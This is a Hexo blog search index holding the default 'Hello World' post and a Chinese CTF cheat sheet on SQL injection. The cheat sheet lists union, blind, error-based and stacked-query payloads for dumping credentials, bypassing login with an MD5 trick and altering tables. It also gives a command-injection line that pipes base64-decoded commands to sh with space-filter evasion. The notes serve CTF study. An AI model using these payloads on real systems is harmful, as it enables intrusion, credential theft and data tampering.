<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2024/04/09/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/11/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h3 id="存在md5加密"><a href="#存在md5加密" class="headerlink" title="存在md5加密"></a>存在md5加密</h3><p><strong>ffifdyop</strong> 经过md5加密后 变成276f722736c95d99e921722cf9ed621c，mysql能将16进制转换为字符，变成   ‘or’6ɝ⬹   ，一个永真式，万能密码</p>
<h3 id="IFS-9-CTF中若space被过滤了，用来代表space以分割字符-单词。"><a href="#IFS-9-CTF中若space被过滤了，用来代表space以分割字符-单词。" class="headerlink" title="$IFS$9:CTF中若space被过滤了，用来代表space以分割字符&#x2F;单词。"></a><strong><code>$IFS$9</code></strong>:CTF中若space被过滤了，用来代表space以分割字符&#x2F;单词。</h3><p>这里解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，只有cat$IFSa.txt的时候,bash解释器会把整个IFSa当做变量名，所以导致没有办法运行，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，而$9指的是当前系统shell进程的第九个参数的持有者，就是一个空字符串，因此$9相当于没有加东西，等于做了一个前后隔离。</p>
<h3 id="一般步骤"><a href="#一般步骤" class="headerlink" title="一般步骤"></a>一般步骤</h3><p><strong>判断注入</strong><br>1 or 1&#x3D;1 数字型注入<br>1’ or ‘1’&#x3D;’1’ 字符型注入<br>1” or “1”&#x3D;”1” 字符型注入</p>
<p><strong>猜SQL查询语句中的字段数</strong><br>1’ order by 2 #</p>
<p><strong>获取当前数据库</strong><br>1’ union select 1,database() #</p>
<p><strong>获取数据库中的表</strong><br>xx’ union select 1,group_concat(table_name） from information_schema.tables where table_schema&#x3D;’数据库名’ #</p>
<p><strong>获取表中字段名</strong><br>xx’ union select 1,group_concat(column_name） from information_schema.columns where table_name&#x3D;’users’ #</p>
<p><strong>查看数据</strong><br>xx’ union select username,password from users #</p>
<p>**(     ‘’%0a’’     ‘’&#x2F;&#x2F;‘’   ‘’%0b’’   ‘’%09’’    ‘’%0c’’  ‘’()’’    “%0d”  “%00”   )  &#x3D;&#x3D;&#x3D;&gt;代替空格  ****</p>
<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p>database()  数据库名<br>version()   数据库版本<br>count()    返回执行结果数量<br>concat()    没有分隔符的链接字符串<br><strong>group_concat()</strong>   连接一个组的所有字符串，并以逗号分隔每一条数据<br><strong>into outfile</strong>     写文件<br>ascii()      字符串的ASCII代码值<br>ord()     返回字符串第一个字符的ASCII值<br>mid()     返回一个字符串的一部分<br>substr()    返回一个字符串的一部分<br>left()     返回字符串最左面几个字符<br>char()    返回整数ASCII代码字符组成的字符串<br>strcmp()       比较字符串内容<br>ifnull()     假如参数1不为NULL，则返回值为参数1，否则其返回值为参数2<br>exp()      返回e的x次方, 当参数过大时会因为溢出2而报错</p>
<p>**extractvalue()**：（报错注入）</p>
<p>第一个参数:XML_docment是String格式，为XML文档对象的名称，文中为Doc</p>
<p>第二个参数：XPath_string(Xpath格式的字符串)</p>
<p>作用：从目标XML中返回包含所查询值的字符串</p>
<p>**updatexml()**：（报错注入）</p>
<p>第一个参数:XML_docment是String格式，为XML文档对象的名称，文中为Doc</p>
<p>第二个参数：Xpath_string(Xpath格式的字符串)</p>
<p>第三个参数:new_value,String格式，替换查找到的符合条件的数据target.com</p>
<p>作用:改变文档中符合条件的节点的值</p>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="1、left-函数"><a href="#1、left-函数" class="headerlink" title="1、left()函数"></a>1、left()函数</h4><p>left(database(),1)&gt;’s’</p>
<p>database()显示数据库名称,left(a,b)从左侧截取a的前b位</p>
<h4 id="2、regexp"><a href="#2、regexp" class="headerlink" title="2、regexp"></a>2、regexp</h4><p>select user() regexp(“r”)</p>
<p>正则表达式的用法user()结果为root,regexp为匹配root的正则表达式</p>
<h4 id="3、like"><a href="#3、like" class="headerlink" title="3、like"></a>3、like</h4><p>select user() like’^ro%’</p>
<p>与regexp类似，使用like进行匹配</p>
<h4 id="4、substr-函数-ascii-函数"><a href="#4、substr-函数-ascii-函数" class="headerlink" title="4、substr()函数 ascii()函数"></a>4、substr()函数 ascii()函数</h4><p>substr()函数 ascii(substr((select database()),1,1))&lt;&gt;98</p>
<p>substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将某个字符转换为ascii值</p>
<h4 id="5、ord-函数-mid-函数"><a href="#5、ord-函数-mid-函数" class="headerlink" title="5、ord()函数 mid()函数"></a>5、ord()函数 mid()函数</h4><p>ord(mid((select user()),1,1))&#x3D;114</p>
<p>mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii(),将字符转为ascii值</p>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>if(left(user(),1)&#x3D;’a’,0,sleep(3));</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p> 以   ‘ <strong>;</strong> ’   结束一条sql语句，多条sql语句一起执行</p>
<p><code>1&#39; union select 1,2,3;update users set password=123 where id=1--+</code></p>
<p>1’;show databases;#</p>
<p>1’;show tables;#</p>
<p>1’;show columns from <code>1919810931114514</code>;#<br>(纯数字需要用反引号  &#96;&#96; 包裹)</p>
<p><strong>（bash被过滤了，所以用sh）<br>&#x2F;?ip&#x3D;127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</strong></p>
<p>（Y2F0IGZsYWcucGhw  &#x3D;&#x3D;&gt;  cat flag.php）</p>
<h3 id="handler-mysql特有"><a href="#handler-mysql特有" class="headerlink" title="handler(mysql特有)"></a>handler(mysql特有)</h3><p>使用handler语句，进行浏览表的数据</p>
<p>1’;handler <code>1919810931114514</code> open;handler <code>1919810931114514</code> read next;#</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml()函数"></a><strong>updatexml()函数</strong></h4><p>语法：updatexml(xml_document,<strong>XPathstring</strong>,new_value)<br>第一个参数是字符串string(XML文档对象的名称)<br>第二个参数是指定字符串中的一个位置（Xpath格式的字符串）<br>第三个参数是将要替换成什么<br>string格式 Xpath定位必须是有效的，否则则会发生错误。我们就能利用这个特性爆出我们想要的数据</p>
<p>实例：</p>
<p> <strong>?id&#x3D;1’ or updatexml(0,concat(0x7e,select database()),1)#</strong></p>
<p>查表名（过滤空格）：**?username&#x3D;1’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),1))#**</p>
<p>查列名：<strong>1’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘H4rDsq1’))),1))#</strong> </p>
<p>查数据：<strong>1’or(updatexml(1,concat(0x7e,(select(group_concat(id,0x7e,username,0x7e,password))from(H4rDsq1))),1))#</strong> </p>
<p>可能因为长度的限制，使用right函数来获取另一半<br><strong>1’or(updatexml(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1))),1))#</strong> </p>
<h4 id="extractvalue-函数"><a href="#extractvalue-函数" class="headerlink" title="extractvalue()函数"></a><strong>extractvalue()函数</strong></h4><p>extractvalue (XML_document, <strong>XPath_string</strong>);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为doc<br> 第二个参数：XPath_string(Xpath格式的字符串)，Xpath定位必须是有效的，否则会发生错误</p>
<p>extractvalue()函数的作用是从目标xml中返回包含所查询值的字符串 </p>
<p>实例：</p>
<p><strong>1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) #</strong></p>
<h4 id="floor-函数"><a href="#floor-函数" class="headerlink" title="floor()函数"></a><strong>floor()函数</strong></h4><p>floor()是mysql的一个取整函数</p>
<p>实例：</p>
<p>*<em>id&#x3D;1’ union select count(</em>),concat(floor(rand(0)<em>2),database()) x from information_schema.schemata group by x #</em>*</p>
<h3 id="设置-sql-mode-PIPES-AS-CONCAT来转换操作符的作用。（sql-mode设置）"><a href="#设置-sql-mode-PIPES-AS-CONCAT来转换操作符的作用。（sql-mode设置）" class="headerlink" title="设置 sql_mode&#x3D;PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置）"></a>设置 <strong>sql_mode&#x3D;PIPES_AS_CONCAT</strong>来转换操作符的作用。（sql_mode设置）</h3><h3 id="利用PIPES-AS-CONCAT令-起到连接符的作用。"><a href="#利用PIPES-AS-CONCAT令-起到连接符的作用。" class="headerlink" title="利用PIPES_AS_CONCAT令||起到连接符的作用。"></a>利用PIPES_AS_CONCAT令||起到连接符的作用。</h3><h3 id="alter"><a href="#alter" class="headerlink" title="alter"></a>alter</h3><p><strong>修改表名：ALTER TABLE 旧表名 RENAME TO 新表名；</strong></p>
<p><strong>修改字段：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</strong></p>
<p><strong>1’;alter table words rename to word;alter table</strong> <code>1919810931114514</code> rename to words;alter table words change flag data varchar(100);alter table words add column id int(10);#</p>
]]></content>
  </entry>
</search>
